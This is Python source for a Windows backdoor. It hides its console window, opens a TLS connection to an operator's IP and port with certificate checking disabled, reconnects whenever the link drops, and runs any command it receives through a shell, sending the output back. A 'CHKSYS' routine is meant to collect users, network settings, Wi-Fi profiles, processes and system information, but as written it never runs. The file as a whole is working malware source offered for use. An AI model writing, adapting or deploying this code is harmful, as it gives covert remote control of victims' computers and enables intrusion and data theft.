import socket
import subprocess
from time import sleep
from os import chdir, getcwd
from win32console import GetConsoleWindow
from win32gui import ShowWindow
import ssl

ip = ""
port = 1234

ShowWindow(GetConsoleWindow(), 0)   # Hide me

# Setting up SSL/TLS context
def sslSet(s):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    # Wrapping socket :)
    ssock = context.wrap_socket(s)
    return ssock


def C2S(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Waiting connection
        while True:
            try:
                s.connect((ip, port))
                return sslSet(s)
            
            except ConnectionRefusedError:
                sleep(3) 
    except OSError:
        pass
        
# execute a subprocess for each command
def chkRet(s, cmd, prefixExists = False, prefix = ''):
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        out, err = p.communicate()
        if p.returncode == 0:
            s.sendall(out)         
            
    except (ConnectionResetError, ConnectionAbortedError):
        s.close()
        s = C2S(ip, port)
    except OSError:
        s.sendall(err)
        pass
    

def rcv(s):
    # Backdooring
    while True:
        prefix = getcwd()+'> '
        s.sendall(prefix.encode())
        try:
            data = s.recv(1024)
            
            if not data:
                s.close()
                sleep(1)
                s = C2S(ip, port)
 
            cmd = data.decode().strip()
            if cmd.startswith("cd "):
                try:
                    chdir(cmd[3:])
                except FileNotFoundError:
                    s.sendall(f"Directory not found: {cmd[3:]}\n".encode())
                continue
            elif cmd.startswith("EXIT"):
                s.close()
                sleep(5)
                s = C2S(ip, port)

            elif cmd.startswith("CHKSYS"):
                cmd = {"Actual_User": "whoami",
                    "Users": "net user",
                    "Ip_info": "ipconfig",
                    "Wlan_Profiles": "netsh wlan show profile",
                    "BG_Net_Service": "netstat",
                    "BG_Tasks": "tasklist",
                    "Info": "systeminfo"}
                #for c in cmd:
                 #   chkRet(s, cmd[c], True, c)
                lambda cmd, s: [chkRet(s, cmd[c], True, c) for c in cmd]                               
            else:
                chkRet(s, cmd)
            
        except (ConnectionResetError, ConnectionAbortedError):
            s.close()
            s = C2S(ip, port)
            

s = C2S(ip, port)
rcv(s)
